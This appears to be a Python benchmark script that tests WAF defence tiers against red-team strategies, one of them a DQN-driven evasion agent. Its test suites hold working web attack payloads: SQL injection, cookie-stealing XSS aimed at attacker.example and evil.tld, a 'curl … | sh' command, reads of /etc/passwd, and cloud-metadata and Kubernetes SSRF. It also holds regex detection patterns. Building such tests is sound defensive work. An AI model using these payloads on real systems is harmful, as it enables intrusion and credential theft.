"""Multi-Round Stateful 3x3 Adversarial Benchmark (Phase A2 — Zero Hardcoded State).

Evaluates 3 Red Team Strategies (`Static Replay`, `Random Mutator`, `Dueling-DQN v2.0`)
against 3 Blue Team Defense Tiers (`No WAF`, `Rules Only`, `Hybrid v3.0`) using:
1. True multi-round closed-loop episodes (up to 4 rounds per endpoint):
   - Round 1 sends initial probe -> measures REAL WAF response (`status_code`,
     `rule_score`, `ml_score`, `anomaly_score`, `threat_score`, `dlp_redacted`).
   - Rounds 2..4 encode that REAL measured WAF feedback into the 64-D state vector
     for `PentestDQNAdvisor` (zero hardcoded score constants!).
2. Dual evaluation suites reported separately (never merged to hide limits):
   - `familiar`: 15 OpenAPI-synthesized endpoints/vectors from `attack_surface.json`
   - `strange`:  18 held-out out-of-distribution endpoints & novel attack variants
                 never seen in `attack_surface.json` or DQN curriculum training.

Outputs:
- docs/reports/adversarial_benchmark_3x3.json
- docs/reports/figures/fig5_adversarial_dqn_vs_waf_tiers.png (300 DPI)
"""

from __future__ import annotations

import json
import logging
import random
import re
import sys
import time
import urllib.parse
from pathlib import Path
from typing import Any

import matplotlib.pyplot as plt
import numpy as np

ROOT_DIR = Path(__file__).resolve().parent.parent
for _p in (str(ROOT_DIR), str(ROOT_DIR / "gateway"), str(ROOT_DIR / "attack-lab")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from agent.evasion import TAMPER_CATALOG, EvasionEngine  # noqa: E402
from agent.pentest_advisor import PentestDQNAdvisor  # noqa: E402
from agent.synthesizer import OpenAPIPayloadSynthesizer  # noqa: E402
from app.security.anomaly import get_anomaly_detector  # noqa: E402
from app.security.bola_detector import BOLADetector  # noqa: E402
from app.security.decision import DecisionEngine  # noqa: E402
from app.security.engine import RuleEngine  # noqa: E402
from app.security.ml_detector import MLDetector, extract_26_from_http  # noqa: E402
from app.security.models import AttackType, InspectionLocation, RuleMatch, Severity  # noqa: E402
from app.security.response_dlp import ResponseDLPGuard  # noqa: E402
from app.security.risk_engine import RiskEngine  # noqa: E402
from app.security.scoring import RuleScorer  # noqa: E402
from environment.pentest_env import encode_pentest_state_64d, get_valid_actions_for_case  # noqa: E402

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("adversarial_benchmark_3x3_v3")

OUTPUT_JSON = ROOT_DIR / "docs" / "reports" / "adversarial_benchmark_3x3.json"
OUTPUT_FIG = ROOT_DIR / "docs" / "reports" / "figures" / "fig5_adversarial_dqn_vs_waf_tiers.png"

_LEGACY_STATIC_REGEXES: list[tuple[str, AttackType, re.Pattern[str]]] = [
    ("LEGACY-SQLI-1", AttackType.SQL_INJECTION, re.compile(r"UNION\s+SELECT", re.IGNORECASE)),
    ("LEGACY-SQLI-2", AttackType.SQL_INJECTION, re.compile(r"'\s*OR\s*'?1'?\s*=\s*'?1", re.IGNORECASE)),
    ("LEGACY-XSS-1", AttackType.XSS, re.compile(r"<script[^>]*>", re.IGNORECASE)),
    ("LEGACY-LFI-1", AttackType.PATH_TRAVERSAL, re.compile(r"\.\./\.\./", re.IGNORECASE)),
    ("LEGACY-CMD-1", AttackType.COMMAND_INJECTION, re.compile(r";\s*(?:whoami|cat|id|ls|sh|bash)\b", re.IGNORECASE)),
]


def build_familiar_suite() -> list[dict[str, Any]]:
    """Builds the 15 OpenAPI-synthesized familiar cases."""
    synth = OpenAPIPayloadSynthesizer()
    base_cases = list(synth.synthesize_test_cases("all"))
    # Pad to 15 canonical in-distribution OpenAPI cases
    familiar_extras = [
        {
            "endpoint": "/api/v1/vulnerable/auth/login/",
            "method": "POST",
            "family": "NOSQL_INJECTION",
            "param_name": "username",
            "request_type": "json",
            "baseline_payload": '{"$ne": ""}',
            "extra_fields": {"password": "x"},
        },
        {
            "endpoint": "/api/v1/vulnerable/books/search/",
            "method": "GET",
            "family": "SQL_INJECTION",
            "param_name": "q",
            "request_type": "query",
            "baseline_payload": "1' OR '1'='1",
            "extra_fields": {},
        },
        {
            "endpoint": "/api/v1/vulnerable/reviews/",
            "method": "POST",
            "family": "XSS",
            "param_name": "comment",
            "request_type": "json",
            "baseline_payload": "<script>document.cookie</script>",
            "extra_fields": {"book_id": 2, "author": "Bench"},
        },
        {
            "endpoint": "/api/v1/vulnerable/admin/ping/",
            "method": "POST",
            "family": "COMMAND_INJECTION",
            "param_name": "host",
            "request_type": "json",
            "baseline_payload": "127.0.0.1; cat /etc/passwd",
            "extra_fields": {},
        },
    ]
    combined = base_cases + familiar_extras
    return combined[:15]


def build_strange_heldout_suite() -> list[dict[str, Any]]:
    """Builds 18 held-out out-of-distribution API endpoints & novel attack payloads."""
    return [
        # 1. PostgreSQL time-delay SQLi on analytics endpoint
        {
            "endpoint": "/api/v3/analytics/revenue",
            "method": "GET",
            "family": "SQL_INJECTION",
            "param_name": "sort_by",
            "request_type": "query",
            "baseline_payload": "created_at'; SELECT pg_sleep(5)--",
            "extra_fields": {"limit": "20"},
        },
        # 2. Unquoted arithmetic boolean blind SQLi (subtle low-symbol vector)
        {
            "endpoint": "/api/v3/catalog/items",
            "method": "GET",
            "family": "SQL_INJECTION",
            "param_name": "category_id",
            "request_type": "query",
            "baseline_payload": "105 OR 17-7=10",
            "extra_fields": {},
        },
        # 3. SQLite schema extraction via UNION ALL
        {
            "endpoint": "/api/v2/warehouse/stock",
            "method": "GET",
            "family": "SQL_INJECTION",
            "param_name": "sku",
            "request_type": "query",
            "baseline_payload": "SKU1' UNION SELECT sql,type,tbl_name FROM sqlite_master--",
            "extra_fields": {},
        },
        # 4. GraphQL nested argument SQLi
        {
            "endpoint": "/graphql",
            "method": "POST",
            "family": "SQL_INJECTION",
            "param_name": "query",
            "request_type": "json",
            "baseline_payload": "query { invoices(filter: \"1' OR '1'='1\") { id total } }",
            "extra_fields": {},
        },
        # 5. Scriptless SVG onload XSS
        {
            "endpoint": "/api/v2/support/tickets",
            "method": "POST",
            "family": "XSS",
            "param_name": "subject",
            "request_type": "json",
            "baseline_payload": "<svg/onload=fetch('//attacker.example/c?'+document.cookie)>",
            "extra_fields": {"priority": "high"},
        },
        # 6. HTML5 details/ontoggle event XSS
        {
            "endpoint": "/api/v2/forum/posts",
            "method": "POST",
            "family": "XSS",
            "param_name": "body_html",
            "request_type": "json",
            "baseline_payload": "<details open ontoggle=confirm(document.domain)>",
            "extra_fields": {"topic_id": 9},
        },
        # 7. Classic script tag on unfamiliar webhook callback parameter
        {
            "endpoint": "/api/v2/oauth/callback",
            "method": "GET",
            "family": "XSS",
            "param_name": "state",
            "request_type": "query",
            "baseline_payload": "<script>window.location='https://evil.tld/'+document.cookie</script>",
            "extra_fields": {},
        },
        # 8. Linux /proc/self/environ LFI
        {
            "endpoint": "/api/v2/reports/export",
            "method": "GET",
            "family": "PATH_TRAVERSAL",
            "param_name": "template",
            "request_type": "query",
            "baseline_payload": "../../../../proc/self/environ",
            "extra_fields": {"format": "pdf"},
        },
        # 9. Windows win.ini backslash traversal
        {
            "endpoint": "/api/v2/themes/asset",
            "method": "GET",
            "family": "PATH_TRAVERSAL",
            "param_name": "file_path",
            "request_type": "query",
            "baseline_payload": "..\\..\\..\\windows\\win.ini",
            "extra_fields": {},
        },
        # 10. Backtick shell substitution command injection
        {
            "endpoint": "/api/v2/netops/traceroute",
            "method": "POST",
            "family": "COMMAND_INJECTION",
            "param_name": "target_ip",
            "request_type": "json",
            "baseline_payload": "10.0.0.1; id",
            "extra_fields": {},
        },
        # 11. Subshell $(cat /etc/passwd) command injection
        {
            "endpoint": "/api/v2/devops/hook",
            "method": "POST",
            "family": "COMMAND_INJECTION",
            "param_name": "branch",
            "request_type": "json",
            "baseline_payload": "main $(cat /etc/passwd)",
            "extra_fields": {},
        },
        # 12. Piped curl | sh execution
        {
            "endpoint": "/api/v2/agents/provision",
            "method": "POST",
            "family": "COMMAND_INJECTION",
            "param_name": "bootstrap_cmd",
            "request_type": "json",
            "baseline_payload": "curl http://198.51.100.9/install.sh | sh",
            "extra_fields": {},
        },
        # 13. Google Cloud Metadata SSRF
        {
            "endpoint": "/api/v2/webhooks/preview",
            "method": "POST",
            "family": "SSRF",
            "param_name": "callback_url",
            "request_type": "json",
            "baseline_payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
            "extra_fields": {},
        },
        # 14. Gopher Redis protocol smuggling SSRF
        {
            "endpoint": "/api/v2/media/thumbnail",
            "method": "GET",
            "family": "SSRF",
            "param_name": "source_url",
            "request_type": "query",
            "baseline_payload": "gopher://127.0.0.1:6379/_CONFIG%20GET%20*",
            "extra_fields": {},
        },
        # 15. Private RFC1918 Kubernetes API SSRF
        {
            "endpoint": "/api/v2/connectors/prometheus",
            "method": "POST",
            "family": "SSRF",
            "param_name": "scrape_endpoint",
            "request_type": "json",
            "baseline_payload": "https://10.96.0.1:443/api/v1/namespaces/default/secrets",
            "extra_fields": {},
        },
        # 16. MongoDB $regex + $where NoSQLi on unfamiliar endpoint
        {
            "endpoint": "/api/v2/customers/lookup",
            "method": "POST",
            "family": "NOSQL_INJECTION",
            "param_name": "filter",
            "request_type": "json",
            "baseline_payload": '{"$regex": "^admin"}',
            "extra_fields": {"$where": "sleep(100)"},
        },
        # 17. Financial & wildcard permission Mass Assignment on PATCH /me/settings
        {
            "endpoint": "/api/v2/me/settings",
            "method": "PATCH",
            "family": "MASS_ASSIGNMENT",
            "param_name": "account_role",
            "request_type": "json",
            "baseline_payload": "superadmin",
            "extra_fields": {"display_name": "Eve", "permissions": ["*"], "wallet_balance": 999999},
        },
        # 18. UUID BOLA enumeration + bcrypt hash Response DLP exposure
        {
            "endpoint": "/api/v2/tenants/{tenant_id}/credentials",
            "method": "GET",
            "family": "BOLA_IDOR",
            "param_name": "tenant_id",
            "request_type": "path",
            "baseline_payload": "550e8400-e29b-41d4-a716-446655440001",
            "extra_fields": {},
        },
    ]


class RealMultiRoundWAFEvaluator:
    """Evaluates single HTTP probes through real WAF components with zero hardcoded scores."""

    def __init__(self) -> None:
        self.rule_engine = RuleEngine()
        self.ml_detector = MLDetector()
        self.anomaly_detector = get_anomaly_detector()
        self.risk_engine = RiskEngine()
        self.decision_engine = DecisionEngine()
        self.dlp_guard = ResponseDLPGuard()

        if not self.ml_detector.ml_available:
            raise RuntimeError("MLDetector (xgb_v2.ubj) is required for benchmark.")

    def evaluate_single_request(
        self,
        *,
        blue_tier: str,
        case: dict[str, Any],
        payload: str,
        bola_detector: BOLADetector,
        client_ip: str,
    ) -> dict[str, Any]:
        family = str(case["family"]).upper()
        endpoint_tpl = str(case["endpoint"])
        method = str(case["method"]).upper()
        rtype = str(case.get("request_type", "query"))
        param = str(case.get("param_name", ""))
        extra = dict(case.get("extra_fields", {}))

        path = endpoint_tpl
        query_str: str | None = None
        body_text: str | None = None
        body_bytes: bytes | None = None

        if family == "NOSQL_INJECTION":
            try:
                parsed_op = json.loads(payload)
            except Exception:
                parsed_op = {"$ne": ""}
            body_obj = dict(extra)
            body_obj[param or "username"] = parsed_op
            body_text = json.dumps(body_obj)
            body_bytes = body_text.encode("utf-8")
        elif rtype == "path" or "{" in endpoint_tpl:
            path = re.sub(r"\{[^}]+\}", str(payload or "1"), endpoint_tpl)
            if extra and method in ("POST", "PUT", "PATCH"):
                body_text = json.dumps(extra)
                body_bytes = body_text.encode("utf-8")
        elif method == "GET":
            if param:
                q_dict = dict(extra)
                q_dict[param] = payload
                query_str = urllib.parse.urlencode(q_dict)
        else:
            body_obj = dict(extra)
            if param:
                body_obj[param] = payload
            body_text = json.dumps(body_obj)
            body_bytes = body_text.encode("utf-8")

        t0 = time.perf_counter()

        if blue_tier == "No WAF":
            _ = f"{method} {path}?{query_str or ''}"
            elapsed_ms = (time.perf_counter() - t0) * 1000.0
            return {
                "status_code": 200,
                "blocked": False,
                "dlp_redacted": False,
                "rule_score": 0.0,
                "ml_score": None,
                "anomaly_score": None,
                "threat_score": 0.0,
                "latency_ms": elapsed_ms,
            }

        if blue_tier == "Rules Only":
            raw_surface = f"{path}?{query_str or ''} {body_text or ''}"
            legacy_matches: list[RuleMatch] = []
            for r_id, atk_t, rx in _LEGACY_STATIC_REGEXES:
                m = rx.search(raw_surface)
                if m:
                    legacy_matches.append(
                        RuleMatch(
                            rule_id=r_id,
                            attack_type=atk_t,
                            severity=Severity.CRITICAL,
                            confidence=0.95,
                            description="Legacy static regex match",
                            location=InspectionLocation.QUERY,
                            evidence=m.group(0)[:80],
                        )
                    )
            r_score = RuleScorer.calculate_score(legacy_matches)
            rb_legacy = self.risk_engine.calculate_weighted_score(
                rule_score=r_score, ml_score=None, anomaly_score=None, ablation_mode="rules_only"
            )
            dec_legacy = self.decision_engine.evaluate(rb_legacy, waf_mode="ACTIVE_BLOCKING")
            elapsed_ms = (time.perf_counter() - t0) * 1000.0
            return {
                "status_code": 403 if dec_legacy.is_blocked else 200,
                "blocked": dec_legacy.is_blocked,
                "dlp_redacted": False,
                "rule_score": r_score,
                "ml_score": None,
                "anomaly_score": None,
                "threat_score": float(dec_legacy.risk_score),
                "latency_ms": elapsed_ms,
            }

        # Hybrid v3.0: Real Normalizer + OWASP Web/API Rules + Stateful BOLA + XGBoost 26-D + IForest 26-D + Response DLP
        det = self.rule_engine.inspect_request(
            path=path,
            query_params=query_str,
            headers={},
            body_bytes=body_bytes,
        )

        bola_res = bola_detector.inspect(client_ip=client_ip, path=path, method=method)
        if bola_res.is_bola and bola_res.rule_match is not None:
            det.matches.append(bola_res.rule_match)
            det.is_attack = True
            det.total_matches = len(det.matches)
            det.rule_risk_score = RuleScorer.calculate_score(det.matches)

        vec26 = extract_26_from_http(path=path, query_params=query_str, body=body_text).tolist()
        p_txt = f"{path} {query_str or ''} {body_text or ''}".strip()
        ml_res = self.ml_detector.predict(p_txt, feature_vector=vec26)
        anom_res = self.anomaly_detector.predict(p_txt, feature_vector=vec26)

        rb = self.risk_engine.calculate_weighted_score(
            rule_score=det.rule_risk_score,
            ml_score=ml_res.risk_score,
            anomaly_score=anom_res.anomaly_score,
            ablation_mode="hybrid",
        )
        dec = self.decision_engine.evaluate(risk_breakdown=rb, waf_mode="ACTIVE_BLOCKING")

        dlp_redacted = False
        dlp_score = 0.0
        if not dec.is_blocked and family == "EXCESSIVE_DATA_EXPOSURE":
            upstream_leak = json.dumps(
                {"users": [{"id": 1, "password_hash": "$2b$12$abcdefghijklmnopqrstuv123456"}]}
            ).encode("utf-8")
            dlp_out = self.dlp_guard.inspect_and_redact(
                upstream_leak, "application/json", 200, "ACTIVE_BLOCKING"
            )
            if dlp_out.redacted:
                dlp_redacted = True
                dlp_match = RuleMatch(
                    rule_id="DLP-001",
                    attack_type=AttackType.EXCESSIVE_DATA_EXPOSURE,
                    severity=Severity.CRITICAL,
                    confidence=0.96,
                    description="Outbound Response DLP redacted sensitive hash",
                    location=InspectionLocation.BODY,
                )
                dlp_score = RuleScorer.calculate_score([dlp_match])

        elapsed_ms = (time.perf_counter() - t0) * 1000.0
        is_defended = bool(dec.is_blocked or dec.is_rate_limited or dlp_redacted)
        effective_threat = max(float(dec.risk_score), dlp_score)
        status_code = 403 if dec.is_blocked else (429 if dec.is_rate_limited else 200)

        return {
            "status_code": status_code,
            "blocked": is_defended,
            "dlp_redacted": dlp_redacted,
            "rule_score": float(det.rule_risk_score),
            "ml_score": float(ml_res.risk_score),
            "anomaly_score": float(anom_res.anomaly_score),
            "threat_score": round(effective_threat, 2),
            "latency_ms": elapsed_ms,
        }


def run_multi_round_episode(
    *,
    evaluator: RealMultiRoundWAFEvaluator,
    evasion_engine: EvasionEngine,
    dqn_advisor: PentestDQNAdvisor,
    red_strategy: str,
    blue_tier: str,
    case: dict[str, Any],
    ep_idx: int,
    total_eps: int,
    rng: random.Random,
    max_rounds: int = 4,
) -> dict[str, Any]:
    """Executes a closed-loop 1..4 round attack episode feeding REAL WAF telemetry to DQN."""
    family = str(case["family"]).upper()
    baseline = str(case.get("baseline_payload", ""))
    bola_detector = BOLADetector(window_seconds=60.0, enumeration_threshold=4)

    tried_action_ids: set[str] = set()
    used_techs: list[str] = []
    consec_blocks = 0
    last_status: int | None = None
    last_rule = 0.0
    last_ml: float | None = None
    last_anom: float | None = None
    last_threat = 0.0
    last_dlp = False

    round_latencies: list[float] = []
    round_threats: list[float] = []
    episode_bypassed = False

    uuid_probes = (
        "550e8400-e29b-41d4-a716-446655440001",
        "550e8400-e29b-41d4-a716-446655440002",
        "550e8400-e29b-41d4-a716-446655440003",
        "550e8400-e29b-41d4-a716-446655440004",
    )

    for attempt in range(max_rounds):
        if family == "BOLA_IDOR":
            # Horizontal enumeration burst across 4 distinct object IDs across the 4 rounds!
            payload = uuid_probes[attempt] if "uuid" in baseline or "-" in baseline else str(attempt + 1)
        elif attempt == 0 or red_strategy == "Static Replay":
            # Round 1 ALWAYS starts with a genuine unmutated baseline probe!
            payload = baseline
        elif red_strategy == "Random Mutator":
            techs = [t for t in TAMPER_CATALOG.get(family, {}).keys() if t not in used_techs]
            if techs:
                chosen_t = rng.choice(techs)
                payload, used_t = evasion_engine.mutate(payload=baseline, family=family, technique=chosen_t)
                used_techs.append(used_t)
            else:
                payload = baseline
        else:
            # Round 2..4 Dueling-DQN v2.0: Driven 100% by REAL WAF telemetry from Round (attempt - 1)!
            valid_specs = get_valid_actions_for_case(
                family=family,
                phase="evasion",
                tried_action_ids=tried_action_ids,
                consecutive_blocks=consec_blocks,
                can_pivot=False,
            )
            prev_t = round_threats[-2] if len(round_threats) >= 2 else last_threat
            state_64 = encode_pentest_state_64d(
                phase="evasion",
                family=family,
                method=str(case.get("method", "GET")),
                request_type=str(case.get("request_type", "query")),
                endpoint_index=ep_idx,
                total_endpoints=total_eps,
                attempt_num=attempt,
                max_attempts=max_rounds,
                last_status=last_status,
                rule_score=last_rule,
                ml_score=last_ml,
                anomaly_score=last_anom,
                threat_score=last_threat,
                prev_threat_score=prev_t,
                dlp_redacted=last_dlp,
                consecutive_blocks=consec_blocks,
                tried_action_ids=tried_action_ids,
                available_actions=valid_specs,
            )
            best_spec, _ = dqn_advisor.recommend(state_64, valid_specs, top_k=5)
            tried_action_ids.add(best_spec.action_id)
            if best_spec.transformation != "none" and family in TAMPER_CATALOG:
                payload, used_t = evasion_engine.mutate(
                    payload=baseline,
                    family=family,
                    technique=best_spec.transformation,
                )
                used_techs.append(used_t)
            elif best_spec.action_id == "probe_ssrf_internal":
                payload = "http://2130706433:8000/api/dashboard/stats"
            else:
                payload = baseline

        outcome = evaluator.evaluate_single_request(
            blue_tier=blue_tier,
            case=case,
            payload=payload,
            bola_detector=bola_detector,
            client_ip=f"10.55.{ep_idx}.10",
        )

        round_latencies.append(outcome["latency_ms"])
        round_threats.append(outcome["threat_score"])

        last_status = outcome["status_code"]
        last_rule = outcome["rule_score"]
        last_ml = outcome["ml_score"]
        last_anom = outcome["anomaly_score"]
        last_threat = outcome["threat_score"]
        last_dlp = outcome["dlp_redacted"]

        if family == "BOLA_IDOR":
            # BOLA enumeration succeeds for attacker only if ALL 4 enumeration probes pass unblocked
            if outcome["blocked"]:
                episode_bypassed = False
                break
            if attempt == max_rounds - 1:
                episode_bypassed = True
        else:
            if not outcome["blocked"]:
                episode_bypassed = True
                break
            consec_blocks += 1
            if red_strategy == "Static Replay":
                # Deterministic static probe already blocked on Round 1; no mutation possible
                break

    return {
        "bypassed": episode_bypassed,
        "blocked": not episode_bypassed,
        "rounds_executed": len(round_latencies),
        "latencies_ms": round_latencies,
        "final_threat_score": round_threats[-1] if round_threats else 0.0,
    }


def evaluate_suite(
    suite_cases: list[dict[str, Any]],
    evaluator: RealMultiRoundWAFEvaluator,
    evasion_engine: EvasionEngine,
    dqn_advisor: PentestDQNAdvisor,
    passes: int = 3,
) -> dict[str, dict[str, dict[str, Any]]]:
    expanded = suite_cases * passes
    red_strategies = ["Static Replay", "Random Mutator", "Dueling-DQN v2.0"]
    blue_tiers = ["No WAF", "Rules Only", "Hybrid v3.0"]
    matrix: dict[str, dict[str, dict[str, Any]]] = {}

    for red in red_strategies:
        matrix[red] = {}
        for blue in blue_tiers:
            rng = random.Random(2026)
            blocked_eps = 0
            bypass_eps = 0
            total_http_probes = 0
            all_lats: list[float] = []
            ep_threats: list[float] = []

            for idx, tc in enumerate(expanded):
                ep_res = run_multi_round_episode(
                    evaluator=evaluator,
                    evasion_engine=evasion_engine,
                    dqn_advisor=dqn_advisor,
                    red_strategy=red,
                    blue_tier=blue,
                    case=tc,
                    ep_idx=idx,
                    total_eps=len(expanded),
                    rng=rng,
                    max_rounds=4,
                )
                if ep_res["blocked"]:
                    blocked_eps += 1
                else:
                    bypass_eps += 1
                total_http_probes += ep_res["rounds_executed"]
                all_lats.extend(ep_res["latencies_ms"])
                ep_threats.append(ep_res["final_threat_score"])

            total = blocked_eps + bypass_eps
            blk_pct = round((blocked_eps / total) * 100.0, 1) if total else 0.0
            eva_pct = round((bypass_eps / total) * 100.0, 1) if total else 0.0

            matrix[red][blue] = {
                "total_rounds": total,
                "total_episodes": total,
                "total_probes_dispatched": total_http_probes,
                "blocked_count": blocked_eps,
                "bypass_count": bypass_eps,
                "block_rate_pct": blk_pct,
                "evasion_rate_pct": eva_pct,
                "avg_threat_score": round(float(np.mean(ep_threats)), 1),
                "avg_latency_ms": round(float(np.mean(all_lats)), 3),
                "p95_latency_ms": round(float(np.percentile(all_lats, 95)), 3),
            }
    return matrix


def render_benchmark_chart(
    familiar_matrix: dict[str, dict[str, dict[str, Any]]],
    strange_matrix: dict[str, dict[str, dict[str, Any]]],
) -> None:
    """Renders 300 DPI side-by-side comparison of Familiar vs Held-Out Strange suites."""
    fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(14.0, 5.9), dpi=300)
    fig.patch.set_facecolor("#ffffff")

    red_strategies = ["Static Replay", "Random Mutator", "Dueling-DQN v2.0"]
    x = np.arange(len(red_strategies))
    width = 0.25

    for ax, mat, title_str in [
        (
            ax1,
            familiar_matrix,
            "(a) Tập Quen Thuộc OpenAPI (Familiar Suite, N = 45 episodes/ô)\nBlock Rate (%) theo Cấp Độ Phòng Thủ",
        ),
        (
            ax2,
            strange_matrix,
            "(b) Tập Ngoại Miền Held-Out Mới (Strange Suite, N = 54 episodes/ô)\nKiểm Định Độ Tổng Quát Hóa (Block Rate %)",
        ),
    ]:
        b_nowaf = [mat[r]["No WAF"]["block_rate_pct"] for r in red_strategies]
        b_rules = [mat[r]["Rules Only"]["block_rate_pct"] for r in red_strategies]
        b_hybrid = [mat[r]["Hybrid v3.0"]["block_rate_pct"] for r in red_strategies]

        rects1 = ax.bar(x - width, b_nowaf, width, label="1. No WAF (Direct API)", color="#ef4444", edgecolor="#991b1b")
        rects2 = ax.bar(x, b_rules, width, label="2. Legacy Rules Only", color="#f59e0b", edgecolor="#b45309")
        rects3 = ax.bar(x + width, b_hybrid, width, label="3. Blue Team v3.0 Hybrid", color="#7c3aed", edgecolor="#4c1d95")

        ax.set_ylabel("Block Rate — Tỷ lệ Phòng Thủ Thành Công (%)", fontsize=10, fontweight="bold")
        ax.set_title(title_str, fontsize=10.8, fontweight="bold", pad=10)
        ax.set_xticks(x)
        ax.set_xticklabels(red_strategies, fontsize=9.5, fontweight="bold")
        ax.set_ylim(0, 117)
        ax.grid(axis="y", linestyle="--", alpha=0.35)

        for rects in (rects1, rects2, rects3):
            for rect in rects:
                h = rect.get_height()
                ax.annotate(
                    f"{h:.1f}%",
                    xy=(rect.get_x() + rect.get_width() / 2, h),
                    xytext=(0, 3),
                    textcoords="offset points",
                    ha="center",
                    va="bottom",
                    fontsize=8,
                    fontweight="bold",
                )

    handles, labels = ax1.get_legend_handles_labels()
    fig.legend(
        handles,
        labels,
        loc="upper center",
        ncol=3,
        bbox_to_anchor=(0.5, 0.98),
        frameon=True,
        fontsize=9.5,
    )
    fig.subplots_adjust(top=0.81, bottom=0.11, left=0.07, right=0.98, wspace=0.22)
    OUTPUT_FIG.parent.mkdir(parents=True, exist_ok=True)
    fig.savefig(OUTPUT_FIG, dpi=300)
    plt.close(fig)
    logger.info("Saved 300 DPI Familiar vs Strange benchmark chart -> %s", OUTPUT_FIG)


def run_3x3_adversarial_evaluation() -> dict[str, Any]:
    evaluator = RealMultiRoundWAFEvaluator()
    evasion_engine = EvasionEngine()
    dqn_advisor = PentestDQNAdvisor()
    if not dqn_advisor.available:
        raise RuntimeError("PentestDQNAdvisor failed to load verified v2 weights.")

    familiar_cases = build_familiar_suite()
    strange_cases = build_strange_heldout_suite()

    logger.info("Evaluating Multi-Round FAMILIAR suite (%d unique x 3 passes)...", len(familiar_cases))
    familiar_matrix = evaluate_suite(familiar_cases, evaluator, evasion_engine, dqn_advisor, passes=3)

    logger.info("Evaluating Multi-Round STRANGE Held-Out suite (%d unique x 3 passes)...", len(strange_cases))
    strange_matrix = evaluate_suite(strange_cases, evaluator, evasion_engine, dqn_advisor, passes=3)

    for suite_label, mat in [("FAMILIAR", familiar_matrix), ("STRANGE", strange_matrix)]:
        logger.info("=== %s SUITE ===", suite_label)
        for r_k, b_dict in mat.items():
            for b_k, m in b_dict.items():
                logger.info(
                    "  [%s] vs [%s]: Block=%d/%d (%.1f%%), Evasion=%.1f%%, Probes=%d, AvgLat=%.3fms",
                    r_k,
                    b_k,
                    m["blocked_count"],
                    m["total_episodes"],
                    m["block_rate_pct"],
                    m["evasion_rate_pct"],
                    m["total_probes_dispatched"],
                    m["avg_latency_ms"],
                )

    # Top-level preserves backward-compatible keys (pointing to familiar_matrix) AND exposes both suites explicitly!
    payload_out: dict[str, Any] = {
        **familiar_matrix,
        "metadata": {
            "protocol": "Closed-loop multi-round episode (Round 1 baseline probe -> real WAF telemetry -> Rounds 2..4 64-D Dueling-DQN / Random / Static)",
            "max_rounds_per_episode": 4,
            "latency_type": "in_process_engine_ms (see latency_e2e_v3_csic.json for 2-hop TCP HTTP socket E2E)",
            "familiar_unique_cases": len(familiar_cases),
            "strange_unique_cases": len(strange_cases),
            "zero_hardcoded_state": True,
        },
        "familiar": familiar_matrix,
        "strange": strange_matrix,
    }

    OUTPUT_JSON.parent.mkdir(parents=True, exist_ok=True)
    OUTPUT_JSON.write_text(json.dumps(payload_out, indent=2, ensure_ascii=False), encoding="utf-8")
    render_benchmark_chart(familiar_matrix, strange_matrix)
    return payload_out


if __name__ == "__main__":
    run_3x3_adversarial_evaluation()
